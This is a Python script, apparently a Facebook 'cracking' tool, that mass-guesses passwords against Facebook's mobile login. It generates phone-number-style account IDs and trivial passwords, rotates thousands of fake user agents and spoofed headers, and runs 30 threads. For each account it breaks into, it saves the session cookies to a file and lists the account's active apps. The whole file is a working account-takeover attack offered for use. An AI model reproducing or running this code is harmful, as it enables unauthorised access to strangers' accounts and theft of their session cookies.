import requests,re,os,sys,string,time,random
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
session = requests.Session()
#==================================#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\rSorry there is no Active  Apk ')
    else:
        print(f'\r\x1b[1;95m Your Active Apps ')
        for i in range(len(game)):
            print(f"\rAPPS ARE ACTIVE "%(i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
        else:
            print(f'\r Sorry, Apk check failed invalid cookie')
    
            
#==============≠≠==============#
BL="\033[1;30m"         # Black
R="\033[1;31m"            # Red
G="\033[1;32m"         # Green
Y="\033[1;33m"        # Yellow
B="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
W="\033[1;37m"         # White
#========================#
loop=0
oks=[]
cps=[]
ugen=[]
ugen2=[]
#Mozilla/5.0 (Linux; Android 10; moto g(7) Build/QPUS30.52-16-2-13; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/281.0.0.13.111;]
for tg in range(5000):
  a='Mozilla/5.0 (Linux; Android '
  b=random.choice(['9','10','11','12','13','14','15'])
  c='note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h=' Mobile Safari/537.36'
  cyberx=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(cyberx) 
#======≠======================#
def Bangladesh(c_userx):
    if len(c_userx)==15:
        if c_userx[:10] in ['1000000000']       :zuyan = ' (*-*) 2009'
        elif c_userx[:9] in ['100000000']       :zuyan = '🌺 2009'
        elif c_userx[:8] in ['10000000']        :zuyan = '🌺 2009'
        elif c_userx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:zuyan = '🌺 2009'
        elif c_userx[:7] in ['1000006','1000007','1000008','1000009']:zuyan = ' 2010'
        elif c_userx[:6] in ['100001']          :zuyan = '🌺 2010/2011'
        elif c_userx[:6] in ['100002','100003'] :zuyan = '🌺 2011/2012'
        elif c_userx[:6] in ['100004']          :zuyan = '🌺 2012/2013'
        elif c_userx[:6] in ['100005','100006'] :zuyan = '🌺 2013/2014'
        elif c_userx[:6] in ['100007','100008'] :zuyan = '🌺 2014/2015'
        elif c_userx[:6] in ['100009']          :zuyan = '🌺 2015'
        elif c_userx[:5] in ['10001']           :zuyan = '🌺 2015/2016'
        elif c_userx[:5] in ['10002']           :zuyan = '🌺 2016/2017'
        elif c_userx[:5] in ['10003']           :zuyan = '🌺 2018/2019'
        elif c_userx[:5] in ['10004']           :zuyan = '🌺 2019/2020'
        elif c_userx[:5] in ['10005']           :zuyan = '🌺 2020'
        elif c_userx[:5] in ['10006','10007','']:zuyan = '🌺 2021'
        elif c_userx[:5] in ['10008']           :zuyan = '🌺 2022'
        elif c_userx[:5] in ['10009']           :zuyan = '🌺 2023'
        else:zuyan=''
    elif len(c_userx) in [9,10]:
        zuyan = ' 🌺 2008/2009'
    elif len(c_userx)==8:
        zuyan = '🌺 2007/2008'
    elif len(c_userx)==7:
        zuyan = '🌺 2006/2007'
    else:zuyan=''
    return zuyan
#==========[logo]==============#

logo=f"""{W}
{R}──────────────────────────────────────────────{W}
{BL}┏[🌺] Facebook {P}: {G}Legends Aery Ace{W}
{BL}┣[🌺] GitHub {P}: {G}Legendhj{W}
{BL}┣[🌺] Network {P}: {Y}Wifi+Data{W}
{BL}┗[🌺] Version {P}: {G}1.0.0/{BL}search{W}:          10.0.0
{R}──────────────────────────────────────────────{W}"""

def clear(): 
	os.system('clear')
	print(logo)
	
		
def Code():
	clear()
	user=[]
	print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
	print(f'┃{W}[{G}+{W}] Examples :{G} 013/018/017/016               ┃')
	print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
	code=input(f'{W}[{G}+{W}] Choice ➤ ')
	print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
	print(f'┃{W}[{G}+{W}] Examples :{G} 1000/2000/5000/9999           ┃')
	print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
	limit = int(input(f'{W}[{G}+{W}] Choice ➤ '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with tred(max_workers=30) as Zuyan:
		clear()
		LM=str(len(user))
		print(f'{BL}┏[🌺] ASSASSINS: {R}GOOD')
		print(f'{BL}┣[🌺] Sim Code :{Y} {code}{W}')
		print(f'{BL}┗[🌺] Crack Limit : {R}{limit}{W}')
		print(45*'━')
		os.system('espeak -a 300 "YOUR CRACK HAS BEEN STARTED PLEASE WAIT"')
		for sex in user:
			uid = code+sex
			pwx = [sex,uid,uid[:8],uid[:7],uid[:6],uid[4:],uid[5:],'i love you']
			Zuyan.submit(rcrack,uid,pwx,LM)
			
def rcrack(uid, pwx, LM):
    global loop
    global oks
    global cps
    try:
        for ps in pwx:
            sys.stdout.write(f'\r{W}[🌺]{G}Cracking {G}~ {W}[{G}{loop}/{LM}{W}{W}] {G}~ {W}[{W}Success•{G}{len(oks)}{W}|{BL}CP•{R}{len(cps)}{W}] \r')
            sys.stdout.flush()        
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
			'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '2.1000001430511475',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
          #  'sec-ch-ua-model': '"Redmi Y3"',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8', data=log_data, headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                c_userx = session.cookies.get_dict()['c_user']
                print(f'\r\033[1;32m[Success:{len(oks)}] {c_userx} | {ps} / {Bangladesh(c_userx)}')
                print(f'\r\033[1;32mCookie➤ {coki}')
                os.system('espeak -a 300 "O,K,bosss"')
                cek_apk(session,coki)
                with open('/sdcard/OK.txt', 'a') as f:
                    f.write(f'{uid} | {ps} | \n Cookes : {coki}\n')
                oks.append(c_userx)
                break
            elif 'checkpoint' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                print(f'\r\033[1;30m[CHECKPOINT🐸] {uid} | {ps}\r')
                os.system('espeak -a 300 "C,P,bosss"')
                with open('/sdcard/CP.txt', 'a') as f:
                    f.write(f'{uid} | {ps}\n')
                cps.append(uid)
                break
            else:
                continue   
        loop += 1
    except:
        pass
        
Code()